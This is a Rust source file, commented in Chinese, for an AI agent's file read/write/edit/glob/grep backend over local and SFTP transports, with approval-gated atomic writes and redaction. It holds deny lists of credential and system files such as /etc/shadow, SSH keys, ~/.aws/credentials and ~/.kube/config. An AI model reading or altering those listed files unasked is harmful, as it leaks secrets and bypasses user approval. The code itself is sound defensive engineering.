//! Agent 文件工具的后端：仿 Claude Code 的 Read / Write / Edit / Glob / Grep。
//!
//! 为什么需要：Agent 原本只能靠 `nx_exec` 发**单行** shell 命令改文件（换行会被拒），
//! 多行内容只能靠 `printf`/`sed -i` 硬拼，转义一错就把文件写坏。这里给它一套直接
//! 读写文件的原语，并且每次写都能产出可审批、可审计的 [`FileChange`]。
//!
//! 分层：
//! - [`FileTransport`]：「文件在哪」的抽象。本地标签走 [`LocalTransport`]（std/tokio fs），
//!   SSH 标签走 [`SftpTransport`]（复用该标签那条已认证连接开 sftp 子系统，
//!   见 `SftpManager::attach_terminal`），单测走 `fake::FakeTransport`（纯内存）。
//! - [`FileOps`]：在任意 transport 之上实现语义 —— 路径规整、`~` 展开、禁写清单、
//!   大小上限、二进制识别、原子替换、差异预览。
//! - [`file_tool_specs`]：给 LLM 的工具声明（`nx_read` 等）。**尚未接进 act.rs**，
//!   接线清单见文件末尾 `接线说明`。
//!
//! 脱敏约定：写入路径**不改写**内容（写回文件的必须是原文）。读出路径（`read` / `grep`）
//! 给模型看的文本在这里就先对整份原文过 `redact::redact_lines`（行数不变）再编行号 / 取行 ——
//! 行号前缀加在脱敏之前会让 PEM 正文躲过扫描。禁读清单（[`DEFAULT_READ_DENY`]）里的路径
//! 不批准不读（[`FileError::ReadDenied`]），grep 遍历时跳过。
//!
//! 接线说明（给之后把它接进 act.rs 的人）：
//! 1. `tool_specs()` 里拼上 [`file_tool_specs`]，按 `TOOL_READ` 等常量分派；
//!    参数用 [`ReadArgs`] 等结构 `serde_json::from_value` 解析。
//! 2. 用 [`transport_for`] 按会话 id 取 transport（本地 / SSH→SFTP），
//!    失败时把错误原样回给模型，让它退回 `nx_exec`。
//! 3. 写 / 改走两段式：[`FileOps::prepare_write`] / [`FileOps::prepare_edit`] 拿到
//!    [`PendingChange`] → 用其中 `change.diff_preview` 出审批卡片 → 批准后
//!    [`FileOps::commit`]（会复核 before_hash，审批期间文件被改动就拒绝；过大的文件也流式算哈希）。
//!    **[`PendingChange::preview_complete`] 为 false 时任何档位都必须先出审批卡**（`files_tool` 已照办）。
//! 4. `allow_sensitive` 只能在用户明确批准后由调用方置位，**不要**开放成模型参数。
//! 5. 结果 `sensitive == true` 时，喂给 LLM / 写入审计前先过 `redact::redact`。
//! 6. 审批卡片 / 审计里展示 `FileChange::atomic`：false 表示远端不支持
//!    `posix-rename@openssh.com`，走了「备份 → 改名」退路。
//! 7. SSH 标签关闭时调用 `sftp.close(&SftpManager::agent_sftp_id(tab))`，
//!    否则 `held` 会替这条连接续命（`attach_terminal` 下次调用时也会顺手收掉）。

#![allow(dead_code)]

use std::collections::VecDeque;

use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use super::llm;

// ——————————————————————————————— 常量 ———————————————————————————————

pub const TOOL_READ: &str = "nx_read";
pub const TOOL_WRITE: &str = "nx_write";
pub const TOOL_EDIT: &str = "nx_edit";
pub const TOOL_GLOB: &str = "nx_glob";
pub const TOOL_GREP: &str = "nx_grep";

/// 单个文件读取上限。与 Claude Code 一致：再大就该用 grep / 分段命令，而不是整个塞进上下文。
pub const DEFAULT_READ_CAP: usize = 256 * 1024;
/// 单次写入上限。Agent 改的是配置与脚本，超过 1 MB 多半是误操作（比如把日志写回去）。
pub const DEFAULT_WRITE_CAP: usize = 1024 * 1024;
/// 不给 limit 时默认返回的行数
pub const DEFAULT_READ_LINES: usize = 2000;
/// 单行展示上限（字符）。压缩过的 JS / 单行 JSON 不截断会一行吃掉整个上下文。
pub const MAX_LINE_CHARS: usize = 2000;
/// 差异预览最多多少行（含文件头与区块头）。超过即截断，并标记「预览不完整」——
/// 审批卡上看不全的修改不能靠自动档位静默落盘，见 [`PendingChange::preview_complete`]。
pub const DIFF_PREVIEW_MAX_LINES: usize = 2000;
/// 预览不完整时 diff 文本的第一行以它开头（前端据此出横幅，见 `src/lib/diff.ts`）
pub const DIFF_INCOMPLETE_MARK: &str = "⚠ 预览不完整";
/// 差异的上下文行数（同 `diff -u`）
const DIFF_CONTEXT: usize = 3;
/// 判断二进制只看开头这么多字节（与 git 的启发式相同）
const BINARY_SNIFF: usize = 8000;
/// grep 结果里每行最多保留的字符数
const GREP_LINE_CHARS: usize = 300;

/// 默认禁写清单。以 `/` 结尾表示整个目录（前缀匹配），否则精确匹配；`~` 按 transport 的家目录展开。
pub const DEFAULT_DENY: &[&str] = &[
    "/etc/shadow",
    "/etc/gshadow",
    "/etc/passwd",
    "/etc/group",
    "/etc/sudoers",
    "/etc/sudoers.d/",
    "/etc/pam.d/",
    "/etc/ssh/",
    "/root/.ssh/",
    "~/.ssh/",
    "~/.gnupg/",
    "~/.aws/credentials",
    "/boot/",
    "/proc/",
    "/sys/",
    "/dev/",
];

/// 默认「禁读」清单：读出来就等于泄漏凭据的路径。语法同 [`DEFAULT_DENY`]，另外允许最后一段带通配符。
///
/// 刻意比禁写清单窄：`/etc/passwd`、`/proc/`、`/etc/ssh/sshd_config` 这些排障时天天要看，
/// 读它们不泄漏秘密；这里只收口令哈希、私钥、云凭据与各类登录令牌。
/// 命中时 [`FileOps::read`] 不给内容，只给元数据并要求用户批准（经 `files_tool` 的审批卡）；
/// grep 遍历时直接跳过。批准后读到的内容仍然要过 [`super::redact::redact_lines`]。
pub const DEFAULT_READ_DENY: &[&str] = &[
    "/etc/shadow",
    "/etc/shadow-",
    "/etc/gshadow",
    "/etc/gshadow-",
    "/etc/security/opasswd",
    "/etc/ssh/ssh_host_*_key",
    "/root/.ssh/",
    "~/.ssh/",
    "~/.gnupg/",
    "~/.aws/credentials",
    "~/.netrc",
    "~/.pgpass",
    "~/.git-credentials",
    "~/.docker/config.json",
    "~/.kube/config",
    "~/.config/gh/hosts.yml",
];

/// 遍历时一律跳过的目录名：体量大、几乎从不是 Agent 要找的东西。
pub const DEFAULT_SKIP_DIRS: &[&str] = &[".git", "node_modules"];

// ——————————————————————————————— 错误 ———————————————————————————————

#[derive(Debug, Clone, PartialEq, thiserror::Error)]
pub enum FileError {
    #[error("路径无效：{0}")]
    InvalidPath(String),
    #[error("参数无效：{0}")]
    InvalidArg(String),
    #[error("不存在：{0}")]
    NotFound(String),
    #[error("「{0}」是目录")]
    IsDirectory(String),
    #[error("「{path}」过大：{size} 字节，超过上限 {cap} 字节")]
    TooLarge { path: String, size: u64, cap: usize },
    #[error("「{0}」看起来是二进制文件，不按文本处理")]
    Binary(String),
    #[error("拒绝写入受保护路径「{0}」：需要用户明确授权")]
    Denied(String),
    /// 禁读清单命中：只给元数据，内容要用户批准才能读（批准后仍脱敏）
    #[error("「{path}」在受保护清单里（密钥 / 凭据，{size} 字节）：需要用户批准才能读取")]
    ReadDenied { path: String, size: u64 },
    /// 编辑语义上的失败（没找到 / 不唯一 / 编码不对），内容已是完整提示
    #[error("{0}")]
    Edit(String),
    /// 审批期间文件被别人改了：按旧内容算出的修改不能再落盘
    #[error("「{0}」在预览之后被改动过，请重新读取后再改")]
    Conflict(String),
    #[error("正则 / 通配符无效：{0}")]
    BadPattern(String),
    /// 底层 I/O 或远端错误，内容已是完整提示
    #[error("{0}")]
    Io(String),
}

impl Serialize for FileError {
    fn serialize<S: serde::Serializer>(&self, s: S) -> Result<S::Ok, S::Error> {
        s.serialize_str(&self.to_string())
    }
}

// ——————————————————————————————— 传输层 ———————————————————————————————

/// 单个路径的元数据（跟随符号链接）
#[derive(Debug, Clone, PartialEq)]
pub struct FileStat {
    pub is_dir: bool,
    pub size: u64,
    pub mtime: Option<u64>,
    /// Unix 权限位；拿不到（Windows / 服务器没给）为 None
    pub mode: Option<u32>,
}

/// 目录项。`is_dir` **不跟随**符号链接 —— 遍历时不会顺着链接绕回自己。
#[derive(Debug, Clone, PartialEq)]
pub struct DirEntry {
    pub name: String,
    pub path: String,
    pub is_dir: bool,
    pub size: u64,
    pub mtime: Option<u64>,
}

/// 「文件在哪」的抽象。所有路径都是**已规整的绝对路径**（`/` 分隔），
/// 规整、`~` 展开、安全检查都在 [`FileOps`] 里做，实现方只管搬字节。
#[async_trait]
pub trait FileTransport: Send + Sync {
    /// 用于提示文案：「本地」「SSH(xxx)」
    fn label(&self) -> String;
    fn is_absolute(&self, path: &str) -> bool {
        path.starts_with('/')
    }
    async fn home(&self) -> Result<String, FileError>;
    /// 不存在返回 `Ok(None)`
    async fn stat(&self, path: &str) -> Result<Option<FileStat>, FileError>;
    /// 消掉符号链接后的真实路径；不支持或解析失败返回 None（只用于加强禁写检查）
    async fn realpath(&self, _path: &str) -> Option<String> {
        None
    }
    /// 读整个文件；超过 `max` 字节报 [`FileError::TooLarge`]
    async fn read(&self, path: &str, max: usize) -> Result<Vec<u8>, FileError>;
    /// 创建或截断写入。**不要求原子**，原子性由 [`FileOps`] 用「临时文件 + 改名」拼出来
    async fn write(&self, path: &str, bytes: &[u8]) -> Result<(), FileError>;
    async fn set_mode(&self, path: &str, mode: u32) -> Result<(), FileError>;
    /// **新建**文件（已存在则失败）并写入，`mode` 在创建那一刻就生效。
    /// 原子写用它建临时文件：替换 0600 的秘密文件时，临时文件从诞生起就是 0600，
    /// 不存在「先按 umask 建成 0644、再 chmod」的全世界可读窗口。
    /// 默认实现退化成 write + set_mode（有窗口），能做到的 transport 应当覆盖它。
    async fn create_with_mode(&self, path: &str, bytes: &[u8], mode: Option<u32>) -> Result<(), FileError> {
        self.write(path, bytes).await?;
        if let Some(m) = mode {
            self.set_mode(path, m & 0o7777).await?;
        }
        Ok(())
    }
    /// 整个文件的 SHA-256。不受读上限约束（应流式计算）：过大、不生成差异的文件也要有 before_hash。
    async fn sha256(&self, path: &str) -> Result<String, FileError> {
        Ok(sha256_hex(&self.read(path, usize::MAX / 2).await?))
    }
    /// 硬链接数；协议给不出（SFTPv3）时返回 None
    async fn link_count(&self, _path: &str) -> Option<u64> {
        None
    }
    /// 把 `from` 的属主 / 属组抄到 `to` 上（以 root 运行时替换别人的文件要用）。做不到就报错，调用方只告警
    async fn copy_owner(&self, _from: &str, _to: &str) -> Result<(), FileError> {
        Ok(())
    }
    /// 普通改名。目标已存在时允许失败（SFTPv3 就是这样）
    async fn rename(&self, from: &str, to: &str) -> Result<(), FileError>;
    /// 原子改名覆盖（目标存在也一步换掉）。不支持时返回 `Ok(false)` 且什么都不做，
    /// [`FileOps`] 会退回「备份 → 改名 → 删备份」。
    async fn rename_atomic(&self, _from: &str, _to: &str) -> Result<bool, FileError> {
        Ok(false)
    }
    async fn remove(&self, path: &str) -> Result<(), FileError>;
    async fn mkdir(&self, path: &str) -> Result<(), FileError>;
    async fn list(&self, dir: &str) -> Result<Vec<DirEntry>, FileError>;
}

// —— 本地 ——

/// 本地文件系统。本地标签里的 shell 就跑在本机上，所以直接读写本机文件即可。
///
/// 注意：如果用户在本地标签里手动 `ssh` 到了别处，这里操作的仍是**本机**文件。
pub struct LocalTransport {
    home: Option<String>,
}

impl LocalTransport {
    pub fn new() -> Self {
        let home = std::env::var("HOME")
            .ok()
            .or_else(|| std::env::var("USERPROFILE").ok())
            .filter(|h| !h.is_empty())
            .map(|h| to_slash(&h));
        Self { home }
    }

    /// 测试用：指定家目录
    pub fn with_home(home: impl Into<String>) -> Self {
        Self { home: Some(to_slash(&home.into())) }
    }
}

impl Default for LocalTransport {
    fn default() -> Self {
        Self::new()
    }
}

fn io_err(path: &str, e: std::io::Error) -> FileError {
    match e.kind() {
        std::io::ErrorKind::NotFound => FileError::NotFound(path.to_string()),
        std::io::ErrorKind::PermissionDenied => FileError::Io(format!("没有权限：{path}")),
        _ => FileError::Io(format!("{path}：{e}")),
    }
}

fn mtime_of(meta: &std::fs::Metadata) -> Option<u64> {
    meta.modified()
        .ok()
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_secs())
}

#[cfg(unix)]
fn mode_of(meta: &std::fs::Metadata) -> Option<u32> {
    use std::os::unix::fs::PermissionsExt;
    Some(meta.permissions().mode())
}

#[cfg(not(unix))]
fn mode_of(_meta: &std::fs::Metadata) -> Option<u32> {
    None
}

#[async_trait]
impl FileTransport for LocalTransport {
    fn label(&self) -> String {
        "本地".into()
    }

    fn is_absolute(&self, path: &str) -> bool {
        path.starts_with('/') || std::path::Path::new(path).is_absolute()
    }

    async fn home(&self) -> Result<String, FileError> {
        self.home
            .clone()
            .ok_or_else(|| FileError::InvalidPath("无法确定本机家目录".into()))
    }

    async fn stat(&self, path: &str) -> Result<Option<FileStat>, FileError> {
        match tokio::fs::metadata(path).await {
            Ok(m) => Ok(Some(FileStat {
                is_dir: m.is_dir(),
                size: m.len(),
                mtime: mtime_of(&m),
                mode: mode_of(&m),
            })),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
            Err(e) => Err(io_err(path, e)),
        }
    }

    async fn realpath(&self, path: &str) -> Option<String> {
        // Windows 上 canonicalize 会带 `\\?\` 前缀，与禁写清单（Unix 路径）对不上，干脆不用
        if cfg!(windows) {
            return None;
        }
        tokio::fs::canonicalize(path)
            .await
            .ok()
            .map(|p| to_slash(&p.to_string_lossy()))
    }

    async fn read(&self, path: &str, max: usize) -> Result<Vec<u8>, FileError> {
        use tokio::io::AsyncReadExt;
        let f = tokio::fs::File::open(path).await.map_err(|e| io_err(path, e))?;
        let mut buf = Vec::new();
        f.take(max as u64 + 1)
            .read_to_end(&mut buf)
            .await
            .map_err(|e| io_err(path, e))?;
        if buf.len() > max {
            return Err(FileError::TooLarge { path: path.into(), size: buf.len() as u64, cap: max });
        }
        Ok(buf)
    }

    async fn write(&self, path: &str, bytes: &[u8]) -> Result<(), FileError> {
        use tokio::io::AsyncWriteExt;
        let mut f = tokio::fs::File::create(path).await.map_err(|e| io_err(path, e))?;
        f.write_all(bytes).await.map_err(|e| io_err(path, e))?;
        // 改名之前落盘：否则断电后可能留下「新名字、空内容」的文件
        f.sync_all().await.map_err(|e| io_err(path, e))?;
        Ok(())
    }

    async fn set_mode(&self, path: &str, mode: u32) -> Result<(), FileError> {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            tokio::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
                .await
                .map_err(|e| io_err(path, e))?;
        }
        #[cfg(not(unix))]
        let _ = (path, mode);
        Ok(())
    }

    async fn create_with_mode(&self, path: &str, bytes: &[u8], mode: Option<u32>) -> Result<(), FileError> {
        use tokio::io::AsyncWriteExt;
        let mut o = tokio::fs::OpenOptions::new();
        // create_new：临时文件名虽是随机的，也不跟随别人预先放好的同名符号链接
        o.write(true).create_new(true);
        #[cfg(unix)]
        if let Some(m) = mode {
            // open(2) 的 mode 还要再与 umask 相与，只会更严，不会更松
            o.mode(m & 0o7777);
        }
        #[cfg(not(unix))]
        let _ = mode;
        let mut f = o.open(path).await.map_err(|e| io_err(path, e))?;
        f.write_all(bytes).await.map_err(|e| io_err(path, e))?;
        f.sync_all().await.map_err(|e| io_err(path, e))?;
        Ok(())
    }

    async fn sha256(&self, path: &str) -> Result<String, FileError> {
        use tokio::io::AsyncReadExt;
        let mut f = tokio::fs::File::open(path).await.map_err(|e| io_err(path, e))?;
        let mut h = Sha256::new();
        let mut buf = vec![0u8; 256 * 1024];
        loop {
            let n = f.read(&mut buf).await.map_err(|e| io_err(path, e))?;
            if n == 0 {
                break;
            }
            h.update(&buf[..n]);
        }
        Ok(h.finalize().iter().map(|b| format!("{b:02x}")).collect())
    }

    async fn link_count(&self, path: &str) -> Option<u64> {
        #[cfg(unix)]
        {
            use std::os::unix::fs::MetadataExt;
            tokio::fs::metadata(path).await.ok().map(|m| m.nlink())
        }
        #[cfg(not(unix))]
        {
            let _ = path;
            None
        }
    }

    async fn copy_owner(&self, from: &str, to: &str) -> Result<(), FileError> {
        #[cfg(unix)]
        {
            use std::os::unix::fs::MetadataExt;
            let src = tokio::fs::metadata(from).await.map_err(|e| io_err(from, e))?;
            let dst = tokio::fs::metadata(to).await.map_err(|e| io_err(to, e))?;
            if (src.uid(), src.gid()) != (dst.uid(), dst.gid()) {
                // 非 root 改不了别人的属主，会 EPERM —— 由调用方告警，不算失败
                std::os::unix::fs::chown(to, Some(src.uid()), Some(src.gid())).map_err(|e| io_err(to, e))?;
            }
        }
        #[cfg(not(unix))]
        let _ = (from, to);
        Ok(())
    }

    async fn rename(&self, from: &str, to: &str) -> Result<(), FileError> {
        tokio::fs::rename(from, to).await.map_err(|e| io_err(to, e))
    }

    async fn rename_atomic(&self, from: &str, to: &str) -> Result<bool, FileError> {
        // POSIX rename(2) 原子覆盖；Windows 上 std 用 MoveFileEx(REPLACE_EXISTING)，同样一步覆盖
        self.rename(from, to).await.map(|()| true)
    }

    async fn remove(&self, path: &str) -> Result<(), FileError> {
        tokio::fs::remove_file(path).await.map_err(|e| io_err(path, e))
    }

    async fn mkdir(&self, path: &str) -> Result<(), FileError> {
        tokio::fs::create_dir(path).await.map_err(|e| io_err(path, e))
    }

    async fn list(&self, dir: &str) -> Result<Vec<DirEntry>, FileError> {
        let mut rd = tokio::fs::read_dir(dir).await.map_err(|e| io_err(dir, e))?;
        let mut out = Vec::new();
        while let Some(e) = rd.next_entry().await.map_err(|e| io_err(dir, e))? {
            // file_type / DirEntry::metadata 都不跟随符号链接，正合遍历所需
            let Ok(ft) = e.file_type().await else { continue };
            let meta = e.metadata().await.ok();
            let name = e.file_name().to_string_lossy().into_owned();
            out.push(DirEntry {
                path: join(dir, &name),
                name,
                is_dir: ft.is_dir(),
                size: meta.as_ref().map(|m| m.len()).unwrap_or(0),
                mtime: meta.as_ref().and_then(mtime_of),
            });
        }
        Ok(out)
    }
}

// —— 远端（SFTP）——

/// 通过 `SftpManager` 里某个已打开的 SFTP 会话访问远端文件。
/// 会话 id 通常来自 `SftpManager::attach_terminal(终端标签 id)`。
pub struct SftpTransport<'a> {
    mgr: &'a crate::sftp::SftpManager,
    id: String,
}

impl<'a> SftpTransport<'a> {
    pub fn new(mgr: &'a crate::sftp::SftpManager, sftp_id: impl Into<String>) -> Self {
        Self { mgr, id: sftp_id.into() }
    }
}

fn sftp_err(e: crate::sftp::SftpError) -> FileError {
    FileError::Io(e.to_string())
}

#[async_trait]
impl FileTransport for SftpTransport<'_> {
    fn label(&self) -> String {
        format!("SSH({})", self.id)
    }

    async fn home(&self) -> Result<String, FileError> {
        self.mgr.home(&self.id).await.map_err(sftp_err)
    }

    async fn stat(&self, path: &str) -> Result<Option<FileStat>, FileError> {
        Ok(self.mgr.stat(&self.id, path).await.map_err(sftp_err)?.map(|e| FileStat {
            is_dir: e.is_dir,
            size: e.size,
            mtime: e.mtime,
            mode: e.permissions,
        }))
    }

    async fn realpath(&self, path: &str) -> Option<String> {
        self.mgr.canonicalize(&self.id, path).await.ok()
    }

    async fn read(&self, path: &str, max: usize) -> Result<Vec<u8>, FileError> {
        self.mgr.read(&self.id, path, max).await.map_err(sftp_err)
    }

    async fn write(&self, path: &str, bytes: &[u8]) -> Result<(), FileError> {
        self.mgr.write(&self.id, path, bytes).await.map_err(sftp_err)
    }

    async fn set_mode(&self, path: &str, mode: u32) -> Result<(), FileError> {
        self.mgr.set_permissions(&self.id, path, mode).await.map_err(sftp_err)
    }

    async fn create_with_mode(&self, path: &str, bytes: &[u8], mode: Option<u32>) -> Result<(), FileError> {
        // 权限随 OPEN 请求的属性一起下发（服务器仍会与它自己的 umask 相与，只会更严）
        self.mgr
            .create_new_with_mode(&self.id, path, bytes, mode.map(|m| m & 0o7777))
            .await
            .map_err(sftp_err)
    }

    async fn sha256(&self, path: &str) -> Result<String, FileError> {
        self.mgr.sha256(&self.id, path).await.map_err(sftp_err)
    }

    async fn rename(&self, from: &str, to: &str) -> Result<(), FileError> {
        self.mgr.rename(&self.id, from, to).await.map_err(sftp_err)
    }

    async fn rename_atomic(&self, from: &str, to: &str) -> Result<bool, FileError> {
        // 服务器声明了 posix-rename@openssh.com 才会真的发包，否则 Ok(false)
        self.mgr.posix_rename(&self.id, from, to).await.map_err(sftp_err)
    }

    async fn remove(&self, path: &str) -> Result<(), FileError> {
        self.mgr.remove(&self.id, path, false).await.map_err(sftp_err)
    }

    async fn mkdir(&self, path: &str) -> Result<(), FileError> {
        self.mgr.mkdir(&self.id, path).await.map_err(sftp_err)
    }

    async fn list(&self, dir: &str) -> Result<Vec<DirEntry>, FileError> {
        Ok(self
            .mgr
            .list(&self.id, dir)
            .await
            .map_err(sftp_err)?
            .into_iter()
            // SFTP readdir 的属性是 lstat 语义：链接到目录的符号链接不算目录，遍历不会绕圈
            .map(|e| DirEntry {
                path: join(dir, &e.name),
                name: e.name,
                is_dir: e.is_dir,
                size: e.size,
                mtime: e.mtime,
            })
            .collect())
    }
}

/// 按终端会话 id 取 transport：本地标签 → 本机文件；SSH 标签 → 在该标签那条
/// 已认证连接上开 SFTP（不重新认证）。两者都不是时报错，调用方应让模型退回 `nx_exec`。
pub async fn transport_for<'a>(
    state: &'a crate::cmd::AppState,
    session_id: &str,
) -> Result<Box<dyn FileTransport + 'a>, FileError> {
    if state.local.contains(session_id) {
        return Ok(Box::new(LocalTransport::new()));
    }
    if state.sessions.contains(session_id) {
        let sftp_id = state
            .sftp
            .attach_terminal(session_id)
            .await
            .map_err(|e| FileError::Io(format!("无法在该 SSH 会话上打开 SFTP：{e}。可改用 nx_exec")))?;
        return Ok(Box::new(SftpTransport::new(&state.sftp, sftp_id)));
    }
    Err(FileError::NotFound(format!("会话 {session_id}")))
}

// ——————————————————————————————— 路径工具 ———————————————————————————————

fn to_slash(p: &str) -> String {
    if cfg!(windows) {
        p.replace('\\', "/")
    } else {
        p.to_string()
    }
}

fn join(dir: &str, name: &str) -> String {
    if dir.ends_with('/') {
        format!("{dir}{name}")
    } else {
        format!("{dir}/{name}")
    }
}

/// 父目录；根目录没有父目录
fn parent_of(path: &str) -> Option<&str> {
    let idx = path.rfind('/')?;
    if idx == 0 {
        return if path.len() > 1 { Some("/") } else { None };
    }
    let parent = &path[..idx];
    // `C:` 这种盘符本身不是目录，父目录应是 `C:/`
    if parent.len() == 2 && parent.ends_with(':') {
        return if path.len() > 3 { Some(&path[..idx + 1]) } else { None };
    }
    Some(parent)
}

fn file_name(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// 纯字面规整：去掉重复的 `/`、`.`，折叠 `..`（不越过根）。
/// 只用于绝对路径；盘符（`C:`）当作根的一部分保留。
fn normalize(path: &str) -> String {
    let abs = path.starts_with('/');
    let mut out: Vec<&str> = Vec::new();
    let mut floor = 0;
    for (i, seg) in path.split('/').enumerate() {
        match seg {
            "" | "." => {}
            ".." => {
                if out.len() > floor {
                    out.pop();
                }
            }
            s => {
                if i == 0 && s.len() == 2 && s.ends_with(':') {
                    floor = 1;
                }
                out.push(s);
            }
        }
    }
    let joined = out.join("/");
    if abs {
        format!("/{joined}")
    } else if floor == 1 && out.len() == 1 {
        format!("{joined}/")
    } else {
        joined
    }
}

fn sha256_hex(bytes: &[u8]) -> String {
    let d = Sha256::digest(bytes);
    d.iter().map(|b| format!("{b:02x}")).collect()
}

fn looks_binary(bytes: &[u8]) -> bool {
    bytes[..bytes.len().min(BINARY_SNIFF)].contains(&0)
}

fn truncate_chars(s: &str, max: usize) -> String {
    match s.char_indices().nth(max) {
        Some((i, _)) => format!("{}…", &s[..i]),
        None => s.to_string(),
    }
}

// ——————————————————————————————— 通配符 ———————————————————————————————

/// 把 glob 翻成锚定正则。支持 `*`（不跨 `/`）、`**`（跨目录，`**/` 可匹配零层）、
/// `?`、`[...]`（`[!...]` 取反）、`{a,b}`。
pub fn glob_to_regex(pattern: &str) -> Result<regex::Regex, FileError> {
    let chars: Vec<char> = pattern.chars().collect();
    let mut re = String::from("^");
    let mut i = 0;
    let mut braces = 0usize;
    while i < chars.len() {
        let c = chars[i];
        match c {
            '*' => {
                if chars.get(i + 1) == Some(&'*') {
                    i += 1;
                    if chars.get(i + 1) == Some(&'/') {
                        i += 1;
                        re.push_str("(?:.*/)?");
                    } else {
                        re.push_str(".*");
                    }
                } else {
                    re.push_str("[^/]*");
                }
            }
            '?' => re.push_str("[^/]"),
            '[' => match chars[i + 1..].iter().position(|&c| c == ']') {
                Some(off) if off > 0 => {
                    let mut body: String = chars[i + 1..i + 1 + off].iter().collect();
                    if let Some(rest) = body.strip_prefix('!') {
                        body = format!("^{rest}");
                    }
                    re.push('[');
                    re.push_str(&body.replace('\\', "\\\\").replace('[', "\\["));
                    re.push(']');
                    i += off + 1;
                }
                _ => re.push_str("\\["),
            },
            '{' => {
                braces += 1;
                re.push_str("(?:");
            }
            ',' if braces > 0 => re.push('|'),
            '}' if braces > 0 => {
                braces -= 1;
                re.push(')');
            }
            c => re.push_str(&regex::escape(&c.to_string())),
        }
        i += 1;
    }
    if braces > 0 {
        return Err(FileError::BadPattern(format!("「{pattern}」的花括号没有闭合")));
    }
    re.push('$');
    regex::Regex::new(&re).map_err(|e| FileError::BadPattern(e.to_string()))
}

fn has_glob_meta(s: &str) -> bool {
    s.contains(['*', '?', '[', '{'])
}

/// 一条（已展开 `~` 的）清单规则是否命中路径 `c`
fn rule_hits(expanded: &str, dir_rule: bool, c: &str) -> bool {
    let base = normalize(expanded);
    if dir_rule {
        c == base || c.starts_with(&format!("{}/", base.trim_end_matches('/')))
    } else if has_glob_meta(&base) {
        glob_to_regex(&base).map(|re| re.is_match(c)).unwrap_or(false)
    } else {
        c == base
    }
}

// ——————————————————————————————— 配置与结果 ———————————————————————————————

/// 遍历上限：远端每列一个目录就是一次往返，必须有硬上限。
#[derive(Debug, Clone)]
pub struct WalkLimits {
    pub max_depth: usize,
    /// 最多列多少个目录
    pub max_dirs: usize,
    /// 最多看多少个目录项
    pub max_entries: usize,
    pub skip_dirs: Vec<String>,
}

impl Default for WalkLimits {
    fn default() -> Self {
        Self {
            max_depth: 12,
            max_dirs: 2_000,
            max_entries: 20_000,
            skip_dirs: DEFAULT_SKIP_DIRS.iter().map(|s| s.to_string()).collect(),
        }
    }
}

#[derive(Debug, Clone)]
pub struct FileOpsConfig {
    pub read_cap: usize,
    pub write_cap: usize,
    /// 禁写清单，语法见 [`DEFAULT_DENY`]
    pub deny: Vec<String>,
    /// 禁读清单（不批准不给内容），语法见 [`DEFAULT_READ_DENY`]
    pub read_deny: Vec<String>,
    pub walk: WalkLimits,
    /// grep 最多扫描多少个文件 / 多少字节
    pub grep_max_files: usize,
    pub grep_max_bytes: u64,
}

impl Default for FileOpsConfig {
    fn default() -> Self {
        Self {
            read_cap: DEFAULT_READ_CAP,
            write_cap: DEFAULT_WRITE_CAP,
            deny: DEFAULT_DENY.iter().map(|s| s.to_string()).collect(),
            read_deny: DEFAULT_READ_DENY.iter().map(|s| s.to_string()).collect(),
            walk: WalkLimits::default(),
            grep_max_files: 2_000,
            grep_max_bytes: 32 * 1024 * 1024,
        }
    }
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ReadResult {
    pub path: String,
    /// `cat -n` 风格：行号右对齐 6 位 + Tab + 内容。
    /// **已脱敏**：先对整份原文过 [`super::redact::redact_lines`]（行数不变）再编行号，
    /// 所以行号仍与真实文件一致，而 PEM 正文之类不会因为行号前缀躲过脱敏
    pub content: String,
    /// 首行行号（1 起）
    pub start_line: usize,
    pub lines_returned: usize,
    pub total_lines: usize,
    /// 后面还有没返回的行
    pub truncated: bool,
    /// 有非法 UTF-8，已按替换字符解码（此时不要拿它当 edit 的原文）
    pub lossy: bool,
    /// 路径在禁读清单里，或脱敏改动了内容
    pub sensitive: bool,
    /// 整个文件的 SHA-256（原文的）
    pub sha256: String,
}

/// 一次写 / 改的审计记录，也是审批卡片的数据源。
#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct FileChange {
    pub path: String,
    pub created: bool,
    /// 原文件的 SHA-256；新建文件，或原文件过大没读时为 None
    pub before_hash: Option<String>,
    pub after_hash: String,
    pub bytes: usize,
    /// edit 实际替换的次数；write 为 0
    pub replacements: usize,
    /// 简短的 unified diff，仅供展示，不保证能当补丁用
    pub diff_preview: String,
    /// 可能含敏感信息（预览里有密钥之类），见模块文档
    pub sensitive: bool,
    /// 落盘是否原子：true = 新建文件，或一步改名覆盖（本地 rename / 远端 posix-rename）；
    /// false = 远端不支持 posix-rename、走了「备份 → 改名 → 删备份」，中间有极短窗口目标不存在。
    /// `prepare_*` 返回的预览里恒为 false，以 `commit` 返回的为准。
    /// 目标有多个硬链接时也是 false：为了不把它从其它链接上拆开，改为原地截断重写。
    pub atomic: bool,
    /// `diff_preview` 是否展示了**全部**修改。false = 差异超过 [`DIFF_PREVIEW_MAX_LINES`]、
    /// 原文件过大或是二进制 —— 审批卡上看不到全部内容，见 [`PendingChange::preview_complete`]
    pub preview_complete: bool,
}

/// 已算好、尚未落盘的修改。审批通过后交给 [`FileOps::commit`]。
#[derive(Debug, Clone)]
pub struct PendingChange {
    pub change: FileChange,
    /// 预览是否完整（与 `change.preview_complete` 相同）。
    ///
    /// **调用方必须遵守**：为 false 时，人在卡片上看不到全部将要写入的内容（注入的载荷可以藏在
    /// 第 3000 行），所以**无论什么档位（含自动 / 托管 Allow、Notify）都必须先出审批卡**，
    /// 卡上写明「预览不完整」，批准后才能 [`FileOps::commit`]。`files_tool::run` 已经这样做；
    /// 直接调 `FileOps` 的新调用方要自己照办。
    pub preview_complete: bool,
    content: Vec<u8>,
    mode: Option<u32>,
    create_dirs: bool,
    /// 预览时文件是否存在 / 当时的完整哈希（原文件过大时为 None，不复核）
    existed: bool,
}

#[derive(Debug, Clone, Default)]
pub struct WriteOptions {
    /// 父目录不存在时是否逐级创建
    pub create_dirs: bool,
    /// 越过禁写清单。只能由调用方在用户明确批准后置位
    pub allow_sensitive: bool,
}

